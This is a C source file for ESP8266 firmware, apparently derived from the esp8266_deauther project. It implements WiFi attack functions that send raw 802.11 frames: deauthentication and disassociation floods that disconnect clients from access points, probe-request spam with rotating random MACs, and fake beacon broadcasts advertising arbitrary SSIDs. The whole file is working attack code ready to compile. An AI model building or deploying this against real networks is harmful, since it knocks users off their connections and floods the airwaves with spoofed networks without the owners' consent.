#include <c_types.h>
#include <mem.h>
#include <ets_sys.h>
#include <osapi.h>
#include <user_interface.h>

#include "user_config.h"
#include "user_attack.h"
#include "user_network.h"

/**
 * Attack foundations from:
 *
 * https://github.com/spacehuhn/esp8266_deauther/tree/master/esp8266_deauther
 */

// Features
static os_timer_t timer;
static uint16_t beacon_counter = 0;

// Protected MACs
uint8_t white_list[2][MAC_ADDR_LEN] =
{
    { 0x77, 0xEA, 0x3A, 0x8D, 0xA7, 0xC8 },
    { 0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF }
};

/******************************************************************************
 * Send packet (no socket, through PHY)
 *******************************************************************************/
bool ICACHE_FLASH_ATTR
user_send_packet(uint8_t* packet, uint16_t packet_size, uint8_t channel, uint16_t tries)
{
    // Set channel
    user_set_wifi_channel(channel);

    // Send
    bool sent = wifi_send_pkt_freedom(packet, packet_size, 0) == 0;

    // Retry
    uint8_t i = 8;
    for (i = 0; i < tries && !sent; i++)
        sent = wifi_send_pkt_freedom(packet, packet_size, 0) == 0;

    return sent;
}

/******************************************************************************
 * Deauth packet attack.
 *******************************************************************************/
bool ICACHE_FLASH_ATTR
user_attack_deauth(uint8_t* ap_mac, uint8_t* client_mac, uint8_t reason, uint8_t channel)
{
    bool success = false;

    // Build deauth packet
    uint16_t packet_size = sizeof(deauth_packet);
    os_memcpy(&deauth_packet[4], client_mac, 6);
    os_memcpy(&deauth_packet[10], ap_mac, 6);
    os_memcpy(&deauth_packet[16], ap_mac, 6);
    deauth_packet[24] = reason;

    // Send deauth frame
    deauth_packet[0] = 0xc0;
    if (user_send_packet(deauth_packet, packet_size, channel, 2))
        success = TRUE;

    // Send disassociate frame
    deauth_packet[0] = 0xa0;
    if (user_send_packet(deauth_packet, packet_size, channel, 2))
        success = TRUE;

    // Send another packet now from AP to Client only if the packet isn't a broadcast
    if (!user_is_mac_broadcast(client_mac))
    {
        // Build deauth packet
        os_memcpy(&deauth_packet[4], ap_mac, 6);
        os_memcpy(&deauth_packet[10], client_mac, 6);
        os_memcpy(&deauth_packet[16], client_mac, 6);

        // Send deauth frame
        deauth_packet[0] = 0xc0;
        if (user_send_packet(deauth_packet, packet_size, channel, 2))
            success = TRUE;

        // Send disassociate frame
        deauth_packet[0] = 0xa0;
        if (user_send_packet(deauth_packet, packet_size, channel, 2))
            success = TRUE;
    }

    return success;
}

/******************************************************************************
 * Probe packet attack.
 *******************************************************************************/
bool ICACHE_FLASH_ATTR
user_attack_probe(const char* ssid, uint8_t channel)
{
    // Update Random Mac
    beacon_random_mac[5] = ++beacon_counter;

    uint16_t packet_size = sizeof(probe_packet);
    uint8_t ssid_len = os_strlen(ssid);

    // Normalize SSID
    if (ssid_len > 32)
        ssid_len = 32;

    // Build probe packet
    os_memcpy(&probe_packet[10], beacon_random_mac, 6);
    os_memcpy(&probe_packet[26], ssid, ssid_len);

    // Send
    if (user_send_packet(probe_packet, packet_size, channel, 2))
        return TRUE;

    return FALSE;
}

/******************************************************************************
 * Beaco packet attack.
 *******************************************************************************/
bool ICACHE_FLASH_ATTR
user_attack_beacon(uint8_t* mac, const char* ssid, uint8_t channel, bool wpa2)
{
    uint16_t packet_size = sizeof(beacon_packet);

    // WPA2
    if (wpa2)
    {
        beacon_packet[34] = 0x31;
    }
    else
    {
        beacon_packet[34] = 0x21;
        packet_size -= 26;
    }

    // SSID
    int ssid_len = os_strlen(ssid);
    if (ssid_len > 32)
        ssid_len = 32;

    os_memcpy(&beacon_packet[10], mac, 6);
    os_memcpy(&beacon_packet[16], mac, 6);
    os_memcpy(&beacon_packet[38], ssid, ssid_len);

    // Channel
    beacon_packet[82] = channel;

    // Calculate final package size
    uint16_t tmp_packet_size = (packet_size - 32) + ssid_len;
    // Packet buffer
    uint8_t* packet_buf = NULL;
    packet_buf = (uint8_t *) os_zalloc(tmp_packet_size);

    // Copy first half of packet into buffer
    os_memcpy(&packet_buf[0], &beacon_packet[0], 38 + ssid_len);
    // Update SSID length byte
    packet_buf[37] = ssid_len;
    // Copy second half of packet into buffer
    os_memcpy(&packet_buf[38 + ssid_len], &beacon_packet[70], wpa2 ? 39 : 13);

    // Send
    if (user_send_packet(packet_buf, tmp_packet_size, channel, 2))
    {
        os_free(packet_buf);
        return TRUE;
    }
    else
    {
        os_free(packet_buf);
        return FALSE;
    }
}